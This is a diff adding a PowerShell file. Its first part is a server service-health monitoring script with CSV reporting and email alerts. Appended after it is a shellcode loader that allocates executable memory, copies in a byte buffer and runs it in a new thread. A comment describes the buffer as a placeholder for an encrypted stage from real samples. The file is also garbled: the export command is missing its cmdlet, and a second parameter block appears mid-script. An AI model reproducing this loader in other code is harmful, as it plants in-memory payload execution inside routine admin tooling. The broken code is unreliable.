@@ -1,0 +1,145 @@
+
+[CmdletBinding()]
+param(
+    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
+    [string[]]$Servers = @('mgmt01', 'filesrv01', 'srv01', 'sql-prod-02'),
+
+    [string[]]$Services = @('Dhcp', 'SNMP', 'Spooler', 'DNS'),
+
+    [Parameter(Mandatory = $false)]
+    [ValidateRange(1, 65535)]
+    [int]$Port = 3389,
+
+    [int]$TimeoutMilliseconds = 5000,
+    [string]$ReportPath = "C:\Reports\service-health-2025-01-21.csv"
+)
+
+function Test-ServerPort {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$ComputerName,
+
+        [int]$Port = 5985,
+        [int]$TimeoutMilliseconds = 2000
+    )
+
+    $client = New-Object System.Net.Sockets.TcpClient
+    try {
+        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
+        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
+        return ($connected -and $client.Connected)
+    }
+    catch {
+        return $false
+    }
+    finally {
+        $client.Close()
+    }
+}
+
+$results = foreach ($srv in $Servers) {
+    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
+        [pscustomobject]@{
+            Server    = $srv
+            Service   = '*'
+            Status    = 'Unreachable'
+            CheckedAt = Get-Date
+        }
+        continue
+    }
+    foreach ($svc in $Services) {
+        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
+        [pscustomobject]@{
+            Server    = $srv
+            Service   = $svc
+            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
+            CheckedAt = Get-Date
+        }
+    }
+}
+$results |
+    -Path $ReportPath `
+    -NoTypeInformation `
+    -Encoding UTF8
+
+$down = @($results | Where-Object { $_.Status -ne 'Running' })
+$down | Format-Table -AutoSize
+Write-Host ("{0} checks, {1} not running" -f @($results).Count, $down.Count) -ForegroundColor Cyan
+$MailTo = "monitoring@adatum.com"
+$down = @($results | Where-Object { $_.Status -ne 'Running' })
+if ($down.Count -gt 0) {
+    $summaryBody = $down | ConvertTo-Html -Fragment | Out-String
+    Send-MailMessage -To $MailTo -From 'monitoring@adatum.com' -Subject "Service alert on $env:COMPUTERNAME" -Body $summaryBody -SmtpServer "smtp.adatum.com" -Port 587 -UseSsl
+}
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+$NativeCode = @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class Win32Api
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+        uint dwFreeType);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+        uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@
+
+Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+# buffer placeholder: random bytes, replaces the encrypted stage in real samples
+$Buffer = [Byte[]] @(
+    0xc1, 0xa1, 0xa4, 0x1d, 0x3e, 0x0e, 0xf9, 0x58, 0x65, 0x5f, 0xe5, 0x7e, 0x8d, 0x67, 0xcb, 0x4a,
+    0xba, 0xda, 0x73, 0xab, 0x39, 0x82, 0xe1, 0xec, 0xff, 0x89, 0x4c, 0x8f, 0x7a, 0xd3, 0xfa, 0x60,
+    0x51, 0x1c, 0x8b, 0xe2, 0x17, 0xb3, 0x15, 0x38, 0xf0, 0x3b, 0x2f, 0x91, 0xcf, 0x9a, 0xca, 0x03,
+    0xc0, 0xc2, 0x44, 0x00, 0x47, 0x7f, 0x2f, 0x6e, 0xb5, 0xb1, 0x56, 0x7a, 0x06, 0xd7, 0x50, 0x38,
+    0xe7, 0x2f, 0x14, 0x1c, 0xde, 0xa0, 0x50, 0x66, 0x0e, 0x74, 0xf8, 0x64, 0x0b, 0x7c, 0x0f, 0xe7,
+    0x43, 0x2b, 0xdf, 0x54, 0xad, 0x56, 0x72, 0xaf, 0x13, 0x42, 0xa5, 0x7e, 0x21, 0x3c, 0x18, 0xe5,
+    0x46, 0xff, 0x6b, 0x70, 0x11, 0x2f, 0x9b, 0xab, 0x42, 0x67, 0x9d, 0x6a, 0x92, 0x06, 0xc3, 0xc8,
+    0x8b, 0xda, 0x3c, 0x49, 0xef, 0x2c, 0xd7, 0xc0, 0x8a, 0xaa, 0x7e, 0x24, 0x81, 0x4e, 0xdb, 0x05,
+    0xbe, 0xd5, 0x89, 0xef, 0x99, 0x59, 0x1c, 0xf5, 0x43, 0xcf, 0xa2, 0x7c, 0x41, 0x8e, 0x85, 0x58,
+    0xea, 0x00, 0x0a, 0x6b, 0x41, 0x38, 0xf3, 0x29, 0xf4, 0x84, 0xce, 0x92, 0xba, 0x43, 0x45, 0x4f,
+    0x02, 0x28, 0x6b, 0xc7, 0xc5, 0x53, 0x77, 0x00, 0x76, 0x7a, 0x2f, 0xe4, 0x85, 0xd9, 0x7f, 0xa3,
+    0x3c, 0x79, 0xa8, 0x12, 0x2c, 0xe5, 0x8c, 0x2b, 0x5d, 0x53, 0x36, 0xc5, 0xd1, 0x86, 0x1b, 0x31,
+    0xc6, 0xc0, 0x47, 0x8f, 0x14, 0xb7, 0x98, 0x4c, 0xa7, 0xd5, 0xe1, 0x82, 0x0c, 0x89, 0x71, 0x94,
+    0x4b, 0x9c, 0x69, 0xd8, 0x7a, 0xf4, 0x9a, 0x28, 0xc2, 0x8f, 0xdf, 0xb0, 0x21, 0x73, 0x47, 0xf2,
+    0x8e, 0xa1, 0x0f, 0x06, 0xdc, 0x9c, 0x22, 0x16, 0xbd, 0xb7, 0x22, 0x11, 0x4c, 0xa3, 0x66, 0xe3,
+    0x7f, 0x20, 0x73, 0x7c, 0xb5, 0xe4, 0x23, 0x42, 0x6e, 0x1d, 0xef, 0x91, 0x2d, 0xaf, 0x52, 0x39,
+    0x90, 0x9f, 0xd1, 0x32, 0x3e, 0x83, 0xd3, 0xd6, 0x31, 0x7c, 0xb4, 0xae, 0x52, 0xd5, 0xd5, 0x7d,
+    0xba, 0xd8, 0x78, 0x70, 0x10, 0xe7
+)
+
+$MemoryHandle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+if ($MemoryHandle -eq [IntPtr]::Zero) {
+    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+    return
+}
+
+[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
+$ThreadId = 0
+$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+[void][Win32Api]::WaitForSingleObject($Thread, 1650)
+[void][Win32Api]::CloseHandle($Thread)
+
+$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
